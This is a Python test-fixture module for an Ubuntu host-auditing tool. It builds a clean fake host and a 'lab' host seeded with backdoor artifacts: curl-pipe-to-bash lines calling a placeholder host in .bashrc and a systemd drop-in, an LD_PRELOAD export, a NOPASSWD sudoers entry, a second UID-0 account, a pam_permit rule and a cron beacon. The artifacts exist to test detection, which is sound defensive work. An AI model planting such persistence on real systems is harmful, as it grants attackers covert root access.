"""Fixture hosts: small file trees that stand in for an Ubuntu host.

Each host is built into a directory and scanned with
``LiveSource(root=..., offline=True)`` (what ``ubuntils analyze --root`` does),
so tests never touch the machine running them. Every file gets a fixed age so
recency rules give the same answer on every run; ``recent`` paths are stamped
"now" instead. Golden outputs, the C1–C9 review regressions and the
scan/analyze parity test all build on these.
"""
from __future__ import annotations

import os
import time

OLD_DAYS = 400

STOCK_PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
admin:x:1000:1000:Admin:/home/admin:/bin/bash
"""
STOCK_SHADOW = """root:*:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
www-data:*:19000:0:99999:7:::
nobody:*:19000:0:99999:7:::
admin:$6$salt$hash:19000:0:99999:7:::
"""
STOCK_GROUP = """root:x:0:
sudo:x:27:admin
docker:x:998:
www-data:x:33:
admin:x:1000:
"""
STOCK_SUDOERS = """Defaults env_reset
root ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d
"""
STOCK_CRONTAB = """SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 * * * * root cd / && run-parts --report /etc/cron.hourly
"""
STOCK_BASHRC = "# ~/.bashrc\n[ -z \"$PS1\" ] && return\nalias ll='ls -alF'\n"
ADMIN_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7Ue8bQnB6m8bPqfV1oQ3n0lJ3m1cGx7Zt0d6s2YqkA "
             "admin@laptop")
OTHER_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEm5nU3cQd1bG3Yt0xR4lQv8m2YQpZ5bZ0n9k1s3T6sB "
             "deploy@ci")

CLEAN = {
    "/etc/os-release": 'NAME="Ubuntu"\nVERSION_ID="24.04"\nPRETTY_NAME="Ubuntu 24.04.3 LTS"\nID=ubuntu\n',
    "/etc/hostname": "fixture\n",
    "/etc/timezone": "Etc/UTC\n",
    "/etc/passwd": STOCK_PASSWD,
    "/etc/shadow": STOCK_SHADOW,
    "/etc/group": STOCK_GROUP,
    "/etc/sudoers": STOCK_SUDOERS,
    "/etc/crontab": STOCK_CRONTAB,
    "/etc/environment": 'PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n',
    "/etc/bash.bashrc": "# System-wide .bashrc\n[ -z \"$PS1\" ] && return\n",
    "/etc/profile": "# /etc/profile\nif [ -d /etc/profile.d ]; then :; fi\n",
    "/etc/nsswitch.conf": "passwd: files systemd\ngroup: files systemd\nhosts: files dns\n",
    "/etc/pam.d/common-auth": ("auth [success=1 default=ignore] pam_unix.so nullok\n"
                               "auth requisite pam_deny.so\nauth required pam_permit.so\n"),
    "/etc/ssh/sshd_config": "PermitRootLogin prohibit-password\n",
    "/home/admin/.bashrc": STOCK_BASHRC,
    "/home/admin/.ssh/authorized_keys": ADMIN_KEY + "\n",
    "/lib/systemd/system/cron.service": "[Service]\nExecStart=/usr/sbin/cron -f\n",
}

# The file-based artifacts of tools/lab/seed-lab.sh (the ones an offline
# --root analysis can see; processes, setuid search, lsattr, dpkg and kernel
# modules need a live host).
LAB = dict(CLEAN)
LAB.update({
    "/etc/passwd": STOCK_PASSWD
    + "ubuntils-lab:x:1001:1001::/home/ubuntils-lab:/bin/bash\n"
    + "ubuntils-lab-root:x:0:0::/root:/usr/sbin/nologin\n",
    "/etc/shadow": STOCK_SHADOW + "ubuntils-lab:!:19000::::::\nubuntils-lab-root:!:19000::::::\n",
    "/etc/cron.d/ubuntils-lab": "0 0 31 2 * root /tmp/ubuntils-lab/beacon\n",
    "/var/spool/cron/crontabs/ubuntils-lab": "0 0 31 2 * sudo /usr/bin/true ubuntils-lab\n",
    "/etc/sudoers.d/ubuntils-lab": "ubuntils-lab ALL=(ALL) NOPASSWD: ALL\n",
    "/home/ubuntils-lab/.ssh/authorized_keys": 'command="/bin/true" ' + OTHER_KEY + "\n",
    "/home/ubuntils-lab/.ssh/authorized_keys2": OTHER_KEY.replace("deploy@ci", "lab@k2") + "\n",
    "/home/ubuntils-lab/.bashrc": STOCK_BASHRC
    + "curl -fsSL http://ubuntils-lab.invalid/x | bash\n"
    + "export LD_PRELOAD=/tmp/ubuntils-lab/libx.so\n",
    "/etc/systemd/system/ubuntils-lab-updater.service":
        "[Service]\nExecStart=/tmp/ubuntils-lab/updater\n",
    "/etc/systemd/system/cron.service.d/ubuntils-lab.conf":
        "[Service]\nExecStart=\nExecStart=/bin/sh -c 'curl -s http://ubuntils-lab.invalid | bash'\n",
    "/etc/pam.d/ubuntils-lab": "auth sufficient pam_permit.so\n",
})

HOSTS = {"clean": CLEAN, "lab": LAB}


def build(root, files: dict, now: float | None = None, recent=(), old_days: int = OLD_DAYS):
    """Write ``files`` (absolute path → content) under ``root``.

    Every file and directory is stamped ``old_days`` ago, except paths in
    ``recent`` (stamped ``now``). Returns ``root`` as a string.
    """
    now = time.time() if now is None else now
    old = now - old_days * 86400
    root = str(root)
    for path, content in files.items():
        dest = os.path.join(root, path.lstrip("/"))
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "w") as fh:
            fh.write(content)
    for dirpath, dirnames, filenames in os.walk(root, topdown=False):
        for name in filenames + dirnames:
            os.utime(os.path.join(dirpath, name), (old, old))
    for path in recent:
        os.utime(os.path.join(root, path.lstrip("/")), (now, now))
    return root


def build_host(name: str, root, **kwargs) -> str:
    return build(root, HOSTS[name], **kwargs)


def fixture_source(root, live_commands: dict | None = None):
    """An offline source over ``root`` whose ctimes equal the mtimes.

    A real filesystem can't backdate ctime, so without this every fixture file
    would look changed "now". ``live_commands`` maps a command name to
    ``(stdout, rc)`` for tests that need command-based collectors.
    """
    from ubuntils.collectors.source import LiveSource

    class FixtureSource(LiveSource):
        def lstat(self, path):
            st = super().lstat(path)
            seq = list(st)
            seq[9] = seq[8]  # st_ctime := st_mtime (int fields)
            extra = {"st_ctime": st.st_mtime, "st_ctime_ns": st.st_mtime_ns,
                     "st_mtime": st.st_mtime, "st_mtime_ns": st.st_mtime_ns,
                     "st_atime": st.st_atime, "st_atime_ns": st.st_atime_ns}
            return os.stat_result(seq, extra)

        def run(self, name, argv, timeout=30):
            if live_commands and name in live_commands:
                out, rc = live_commands[name]
                return out, "", rc
            return super().run(name, argv, timeout=timeout)

    return FixtureSource(root=str(root), offline=True)
